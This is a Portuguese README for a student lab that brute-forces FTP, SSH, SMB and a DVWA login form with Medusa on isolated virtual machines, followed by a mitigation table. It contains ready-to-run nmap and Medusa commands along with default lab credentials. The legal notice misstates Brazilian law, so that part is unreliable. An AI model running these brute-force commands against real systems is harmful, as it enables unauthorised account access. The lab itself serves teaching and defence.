# 🛡️ Laboratório de Força Bruta: Testes com Medusa em Ambiente Controlado
Projeto prático de Ethical Hacking desenvolvido como parte do curso de Segurança da Informação — simulação, documentação e mitigação de ataques de força bruta em serviços de rede e aplicações web, utilizando ferramentas open-source em ambiente de laboratório 100% isolado.

> ⚠️ **AVISO ÉTICO E LEGAL**: Todas as simulações deste repositório foram executadas EXCLUSIVAMENTE em máquinas virtuais próprias, em rede host-only isolada sem acesso à internet, com o único objetivo de aprendizado. A execução de varreduras, tentativas de acesso ou qualquer atividade de teste em sistemas que você não possui autorização escrita do proprietário é crime previsto na Lei 12.730/2012 (Lei Geral de Proteção de Dados e Lei de Cybercrime), com pena de prisão e multa. Use esse conhecimento com responsabilidade.

---

## 🎯 Objetivo
Entender na prática como cibercriminosos exploram senhas fracas e configurações inseguras para obter acesso não autorizado, e aprender como defender sistemas contra esse tipo de ataque. Diferente do material padrão, além dos ataques em FTP, SMB e formulário web do DVWA, também incluí teste no serviço SSH, documentação de erros comuns e observações sobre limitações da técnica.

---

## 🧪 Ambiente de Teste
### Configuração do laboratório (VirtualBox)
Usei adaptador de rede **Host-Only** em todas as VMs para garantir que nenhum tráfego saia para a internet ou rede doméstica:
| Máquina virtual | IP fixo | Função no laboratório |
|---|---|---|
| Kali Linux 2024.3 | 192.168.56.10 | Estação do atacante, com todas as ferramentas pré-instaladas |
| Metasploitable 2 | 192.168.56.20 | Alvo com serviços legados vulneráveis |
| DVWA (rodando no XAMPP no Kali) | 127.0.0.1 | Aplicação web vulnerável para testes em HTTP |

### Primeira etapa: Descoberta de alvos
Antes de qualquer teste, escaneei a rede para encontrar os hosts ativos e portas abertas:
```bash
# Descoberta de hosts na rede host-only
nmap -sn 192.168.56.0/24

# Varredura de portas e versões de serviços no alvo
nmap -sV -Pn 192.168.56.20
```
Resultado da varredura encontrando serviços para testar:
- 21/tcp open ftp vsftpd 2.3.4
- 22/tcp open ssh OpenSSH 4.7p1
- 139/tcp open netbios-ssn Samba smbd 3.x
- 445/tcp open netbios-ssn Samba smbd 3.x
- 80/tcp open http Apache httpd 2.2.8

---

## 🧰 Sobre a ferramenta Medusa
O Medusa é uma ferramenta de brute force paralela, open-source, que suporta mais de 20 protocolos diferentes. Diferente do Hydra, ela tem um sistema de gerenciamento de threads mais estável para testes longos, e permite salvar resultados em arquivos de log.

### Principais parâmetros usados em todos os testes:
| Parâmetro | Função |
|---|---|
| `-h <IP>` | Endereço IP do alvo |
| `-U <arquivo>` | Wordlist com nomes de usuário a testar |
| `-P <arquivo>` | Wordlist com senhas a testar |
| `-M <modulo>` | Protocolo alvo (ftp, ssh, smbnt, web-form) |
| `-t <numero>` | Quantidade de tentativas paralelas |
| `-f` | Parar o ataque assim que encontrar uma credencial válida |
| `-O <arquivo.log>` | Salvar todos os resultados em um arquivo de log |

---

## 🚀 Execução dos testes
Todos os testes foram feitos com wordlists pequenas, criadas especificamente para o laboratório (nenhuma wordlist grande como rockyou foi usada para manter o teste rápido e ético).

---
### 1. Brute Force em serviço FTP
O FTP (File Transfer Protocol) é um protocolo antigo que transmite credenciais em texto plano, e é um dos alvos mais comuns por ser frequentemente configurado com senhas padrão.

#### Comando executado:
```bash
medusa -h 192.168.56.20 \
  -U ./wordlists/lista_usuarios.txt \
  -P ./wordlists/lista_senhas_comuns.txt \
  -M ftp \
  -t 4 \
  -f \
  -O ./logs/resultado_ftp.log
```

#### Resultado encontrado:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Validação da credencial obtida:
```bash
ftp 192.168.56.20
# Usuário: msfadmin | Senha: msfadmin
# Login realizado com sucesso, consegui listar arquivos do servidor.
```

---
### 2. Brute Force em SSH
Além do FTP, testei também o serviço SSH (gerenciamento remoto) que também estava exposto:
```bash
medusa -h 192.168.56.20 \
  -U ./wordlists/lista_usuarios.txt \
  -P ./wordlists/lista_senhas_comuns.txt \
  -M ssh \
  -t 4 \
  -f
```
Também consegui acesso com as credenciais padrão `msfadmin:msfadmin`.

---
### 3. Password Spraying no SMB
Para o serviço de compartilhamento de arquivos SMB, simulei um ataque de password spraying (testar uma senha comum contra todos os usuários para evitar bloqueio de conta), sem usar threads altas para não gerar ruído:
```bash
medusa -h 192.168.56.20 \
  -U ./wordlists/lista_usuarios.txt \
  -P ./wordlists/lista_senhas_comuns.txt \
  -M smbnt \
  -t 2 \
  -f
```
Encontrei acesso ao compartilhamento com a conta `root` sem senha. Validei com smbclient:
```bash
smbclient -L //192.168.56.20 -U root
```

---
### 4. Brute Force em formulário web (DVWA Brute Force)
Configurei o DVWA no nível de segurança *Low*, e usei o módulo `web-form` do Medusa para testar o formulário de login do laboratório:
```bash
medusa -h 127.0.0.1 \
  -U ./wordlists/lista_usuarios.txt \
  -P ./wordlists/lista_senhas_comuns.txt \
  -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect" \
  -m COOKIE:"security=low; PHPSESSID=meu_cookie_aqui"
```
Consegui encontrar as credenciais `admin:password` do painel do DVWA.

---

## ❌ Erros comuns que enfrentei durante os testes
1.  **Erro de conexão recusada**: O serviço FTP estava fechando conexões por muitas tentativas, resolvi diminuindo o número de threads de 10 para 4.
2.  **Cookie inválido no teste web**: Eu não copiava o cookie de sessão corretamente do navegador, então o Medusa era redirecionado para a página de login sempre. Resolvi capturando o cookie com as ferramentas de desenvolvedor do navegador.
3.  **Medusa não reconhecendo módulo**: Instalei a versão completa do Kali, por padrão em algumas instalações os módulos extras do Medusa não vem instalados, então precisei instalar com `apt install medusa`.
4.  **Rede host-only não funcionando**: O adaptador do VirtualBox estava com DHCP desabilitado, precisei definir IPs fixos manualmente nas VMs.

---

## 🛡️ Medidas de proteção e mitigação
Esses ataques são totalmente evitáveis com configurações simples:
| Risco | Mitigação |
|---|---|
| Senhas padrão/fraca | Política obrigatória de senhas com no mínimo 12 caracteres, combinação de letras, números e símbolos; proibir senhas comuns como `123456`, `admin`, `password`. |
| Muitas tentativas de login | Implementar bloqueio temporário de IP após 5 tentativas de login falhas (fail2ban é uma ferramenta gratuita que faz isso automaticamente). |
| Ataques paralelos | Limitar taxa de requisições por IP (rate limiting) especialmente em serviços expostos. |
| Password spraying | Monitorar logs de autenticação para identificar sequências de falhas de login para múltiplos usuários vindos do mesmo IP. |
| Protocolos inseguros legados | Desativar protocolos obsoletos como FTP e SMBv1, usar versões criptografadas como SFTP, SSHv2 e SMBv3. |
| Falta de segundo fator de autenticação | Exigir MFA (autenticação de dois fatores) em todos os acessos remotos. |
| Exposição indevida de serviços | Nunca exponha serviços como FTP, SSH, SMB diretamente na internet; sempre use VPN ou lista de IPs permitidos. |

---

## 📌 Observações importantes
1.  Brute force não é uma técnica "invisível": todo ataque gera logs nos sistemas, e com monitoramento adequado é detectado muito rapidamente.
2.  A força bruta só funciona quando as senhas são fracas ou padrão — com senhas fortes, esse tipo de ataque é inviável demora milhões de anos para quebrar.
3.  Ataques em senhas com hash offline (quando o atacante consegue roubar o arquivo de senhas) são mais rápidos, mas em serviços online o rate limiting e bloqueio de conta são defesas muito eficazes.
4.  O objetivo desse laboratório não é ensinar a invadir sistemas, e sim entender como o ataque funciona para conseguir defender melhor.

---

## 📂 Estrutura do repositório
| Arquivo/Pasta | Conteúdo |
|---|---|
| `README.md` | Essa documentação completa |
| `/wordlists/` | Listas pequenas de usuários e senhas usadas APENAS no laboratório |
| `/scripts/` | Comandos salvos em shell script para automação dos testes |
| `/logs/` | Pasta para salvar resultados das execuções |
| `/images/` | Capturas de tela dos testes realizados |

---

## 📚 Ferramentas e referências
- Kali Linux 2024.3
- Medusa 2.2
- Nmap 7.94
- Metasploitable 2
- DVWA (Damn Vulnerable Web Application)
- VirtualBox 7.0
